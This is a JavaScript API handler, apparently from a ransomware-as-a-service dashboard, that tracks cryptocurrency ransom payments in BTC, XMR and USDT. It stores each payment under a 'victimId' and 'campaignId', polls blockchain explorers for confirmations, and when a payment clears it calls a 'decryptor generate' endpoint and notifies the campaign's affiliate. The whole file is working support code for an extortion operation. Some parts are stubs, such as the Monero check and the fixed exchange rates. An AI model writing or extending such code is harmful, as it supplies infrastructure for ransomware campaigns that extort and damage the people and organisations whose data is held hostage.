// vercel-dashboard/api/payments/monitor.js
// Blockchain payment monitoring (BTC, XMR, USDT)

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

// In production, these would use proper blockchain APIs:
// BTC: Blockstream, BlockCypher, or self-hosted Electrum server
// XMR: MyMonero, xmrchain, or self-hosted monerod RPC
// USDT: Etherscan (ERC20), Tronscan (TRC20), or self-hosted node

const BLOCKCHAIN_CONFIG = {
  BTC: {
    apiUrl: process.env.BTC_API_URL || 'https://blockstream.info/api',
    confirmationsRequired: 3,
    addressRegex: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
  },
  XMR: {
    apiUrl: process.env.XMR_API_URL || 'https://xmrchain.net/api',
    confirmationsRequired: 10,
    addressRegex: /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/,
  },
  USDT_ERC20: {
    apiUrl: process.env.ETHERSCAN_API_URL || 'https://api.etherscan.io/api',
    apiKey: process.env.ETHERSCAN_API_KEY,
    contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    confirmationsRequired: 12,
    addressRegex: /^0x[a-fA-F0-9]{40}$/,
  },
  USDT_TRC20: {
    apiUrl: process.env.TRONSCAN_API_URL || 'https://apilist.tronscan.org/api',
    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    confirmationsRequired: 19,
    addressRegex: /^T[a-zA-Z0-9]{33}$/,
  },
};

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'admin') {
    return response.status(403).json({ error: 'Admin access required' });
  }

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Payment monitor error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response) {
  const { action, paymentId, currency } = request.query;

  if (action === 'check' && paymentId) {
    // Check specific payment
    const payment = await kv.get(`payment:${paymentId}`);
    if (!payment) {
      return response.status(404).json({ error: 'Payment not found' });
    }

    const result = await checkPayment(payment);
    return response.json(result);
  }

  if (action === 'pending' && currency) {
    // Get all pending payments for a currency
    const payments = await getPendingPayments(currency);
    return response.json({ payments });
  }

  // Default: return monitor status
  const status = await getMonitorStatus();
  return response.json(status);
}

async function handlePost(request, response) {
  const { action, paymentId, currency, walletAddress, amount, victimId, campaignId } = request.body;

  if (action === 'register') {
    // Register a new payment to monitor
    if (!paymentId || !currency || !walletAddress || !amount || !victimId || !campaignId) {
      return response.status(400).json({ error: 'Missing required fields' });
    }

    const payment = {
      id: paymentId,
      currency: currency.toUpperCase(),
      walletAddress,
      amountUsd: amount,
      amountCrypto: await convertUsdToCrypto(amount, currency),
      victimId,
      campaignId,
      status: 'pending',
      registeredAt: new Date().toISOString(),
      confirmations: 0,
      requiredConfirmations: BLOCKCHAIN_CONFIG[currency]?.confirmationsRequired || 3,
      txHash: null,
      blockHeight: null,
      lastChecked: null,
    };

    await kv.set(`payment:${paymentId}`, payment);
    await kv.sadd(`campaign:${campaignId}:payments`, paymentId);
    await kv.sadd(`global:pending_payments:${currency}`, paymentId);

    return response.status(201).json(payment);
  }

  if (action === 'check_all') {
    // Trigger check for all pending payments
    const results = await checkAllPendingPayments();
    return response.json({ checked: results.length, results });
  }

  return response.status(400).json({ error: 'Invalid action' });
}

async function checkPayment(payment) {
  const config = BLOCKCHAIN_CONFIG[payment.currency];
  if (!config) {
    return { ...payment, error: `Unsupported currency: ${payment.currency}` };
  }

  try {
    let txData = null;

    switch (payment.currency) {
      case 'BTC':
        txData = await checkBtcPayment(payment.walletAddress, payment.amountCrypto, config);
        break;
      case 'XMR':
        txData = await checkXmrPayment(payment.walletAddress, payment.amountCrypto, config);
        break;
      case 'USDT_ERC20':
        txData = await checkUsdtErc20Payment(payment.walletAddress, payment.amountCrypto, config);
        break;
      case 'USDT_TRC20':
        txData = await checkUsdtTrc20Payment(payment.walletAddress, payment.amountCrypto, config);
        break;
    }

    if (txData) {
      const updated = {
        ...payment,
        txHash: txData.txHash,
        blockHeight: txData.blockHeight,
        confirmations: txData.confirmations,
        lastChecked: new Date().toISOString(),
        status: txData.confirmations >= payment.requiredConfirmations ? 'confirmed' : 'pending',
      };

      await kv.set(`payment:${payment.id}`, updated);

      // If confirmed, trigger decryptor delivery
      if (updated.status === 'confirmed' && payment.status !== 'confirmed') {
        await onPaymentConfirmed(updated);
      }

      return updated;
    }

    return {
      ...payment,
      lastChecked: new Date().toISOString(),
      status: 'pending',
    };
  } catch (error) {
    console.error(`Error checking ${payment.currency} payment:`, error);
    return {
      ...payment,
      lastChecked: new Date().toISOString(),
      error: error.message,
    };
  }
}

async function checkBtcPayment(address, expectedAmount, config) {
  // Query Blockstream API for address transactions
  const url = `${config.apiUrl}/address/${address}/txs`;
  const response = await fetch(url);
  const txs = await response.json();

  for (const tx of txs) {
    for (const vout of tx.vout) {
      if (vout.scriptpubkey_address === address) {
        const amountBtc = vout.value / 1e8;
        if (amountBtc >= expectedAmount * 0.99) { // Allow 1% tolerance
          const confirmations = await getBtcConfirmations(tx.txid, config);
          return {
            txHash: tx.txid,
            blockHeight: tx.status.block_height,
            confirmations,
            amount: amountBtc,
          };
        }
      }
    }
  }
  return null;
}

async function checkXmrPayment(address, expectedAmount, config) {
  // XMR requires view key or subaddress indexing - simplified for demo
  // In production: use monerod RPC with view key to scan for incoming transfers
  const url = `${config.apiUrl}/address/${address}`;
  const response = await fetch(url);
  const data = await response.json();

  // This is a placeholder - real implementation needs view key
  return null;
}

async function checkUsdtErc20Payment(address, expectedAmount, config) {
  // Query Etherscan for ERC20 token transfers
  const url = `${config.apiUrl}?module=account&action=tokentx&address=${address}&contractaddress=${config.contractAddress}&apikey=${config.apiKey}`;
  const response = await fetch(url);
  const data = await response.json();

  if (data.status === '1' && data.result) {
    for (const tx of data.result) {
      const amountUsdt = parseInt(tx.value) / 1e6; // USDT has 6 decimals
      if (amountUsdt >= expectedAmount * 0.99) {
        const confirmations = await getEthConfirmations(tx.blockNumber, config);
        return {
          txHash: tx.hash,
          blockHeight: parseInt(tx.blockNumber),
          confirmations,
          amount: amountUsdt,
        };
      }
    }
  }
  return null;
}

async function checkUsdtTrc20Payment(address, expectedAmount, config) {
  // Query Tronscan for TRC20 transfers
  const url = `${config.apiUrl}/token/trc20/transfers?contract_address=${config.contractAddress}&address=${address}&limit=50`;
  const response = await fetch(url);
  const data = await response.json();

  if (data.data) {
    for (const tx of data.data) {
      const amountUsdt = parseInt(tx.amount) / 1e6;
      if (amountUsdt >= expectedAmount * 0.99) {
        const confirmations = await getTronConfirmations(tx.block, config);
        return {
          txHash: tx.transaction_id,
          blockHeight: tx.block,
          confirmations,
          amount: amountUsdt,
        };
      }
    }
  }
  return null;
}

async function getBtcConfirmations(txid, config) {
  const url = `${config.apiUrl}/tx/${txid}`;
  const response = await fetch(url);
  const tx = await response.json();
  if (tx.status.confirmed) {
    const tipResponse = await fetch(`${config.apiUrl}/blocks/tip/height`);
    const tipHeight = await tipResponse.json();
    return tipHeight - tx.status.block_height + 1;
  }
  return 0;
}

async function getEthConfirmations(blockNumber, config) {
  const url = `${config.apiUrl}?module=proxy&action=eth_blockNumber&apikey=${config.apiKey}`;
  const response = await fetch(url);
  const data = await response.json();
  const latestBlock = parseInt(data.result, 16);
  return latestBlock - parseInt(blockNumber) + 1;
}

async function getTronConfirmations(blockNumber, config) {
  const url = `${config.apiUrl}/block/latest`;
  const response = await fetch(url);
  const data = await response.json();
  return data.block_header.raw_data.number - parseInt(blockNumber) + 1;
}

async function convertUsdToCrypto(usdAmount, currency) {
  // In production, fetch real-time rates from CoinGecko, CoinMarketCap, etc.
  const rates = {
    BTC: 50000,      // $50,000 per BTC
    XMR: 150,        // $150 per XMR
    USDT_ERC20: 1,   // $1 per USDT
    USDT_TRC20: 1,
  };
  return usdAmount / (rates[currency] || 1);
}

async function getPendingPayments(currency) {
  const paymentIds = await kv.smembers(`global:pending_payments:${currency}`) || [];
  const payments = [];
  for (const pid of paymentIds) {
    const payment = await kv.get(`payment:${pid}`);
    if (payment && payment.status === 'pending') {
      payments.push(payment);
    }
  }
  return payments;
}

async function checkAllPendingPayments() {
  const currencies = ['BTC', 'XMR', 'USDT_ERC20', 'USDT_TRC20'];
  const results = [];

  for (const currency of currencies) {
    const payments = await getPendingPayments(currency);
    for (const payment of payments) {
      const result = await checkPayment(payment);
      results.push(result);
    }
  }

  return results;
}

async function onPaymentConfirmed(payment) {
  console.log(`Payment confirmed: ${payment.id} for victim ${payment.victimId}`);

  // Trigger decryptor generation
  try {
    const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/decryptor/generate`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${process.env.MASTER_API_KEY}`,
      },
      body: JSON.stringify({
        victimId: payment.victimId,
        campaignId: payment.campaignId,
        paymentId: payment.id,
      }),
    });

    if (response.ok) {
      console.log(`Decryptor generated for victim ${payment.victimId}`);
    }
  } catch (error) {
    console.error('Failed to trigger decryptor generation:', error);
  }

  // Notify affiliate
  await notifyAffiliatePayment(payment);
}

async function notifyAffiliatePayment(payment) {
  const campaign = await kv.get(`campaign:${payment.campaignId}`);
  if (campaign?.affiliateId) {
    // In production: send webhook, email, Telegram, etc.
    console.log(`Notify affiliate ${campaign.affiliateId} of payment ${payment.id}`);
  }
}

async function getMonitorStatus() {
  const status = {
    currencies: {},
    totalPending: 0,
    totalConfirmed: 0,
    lastCheck: null,
  };

  for (const currency of Object.keys(BLOCKCHAIN_CONFIG)) {
    const pendingIds = await kv.smembers(`global:pending_payments:${currency}`) || [];
    let pending = 0;
    let confirmed = 0;
    
    for (const pid of pendingIds) {
      const payment = await kv.get(`payment:${pid}`);
      if (payment) {
        if (payment.status === 'confirmed') confirmed++;
        else pending++;
      }
    }

    status.currencies[currency] = { pending, confirmed };
    status.totalPending += pending;
    status.totalConfirmed += confirmed;
  }

  return status;
}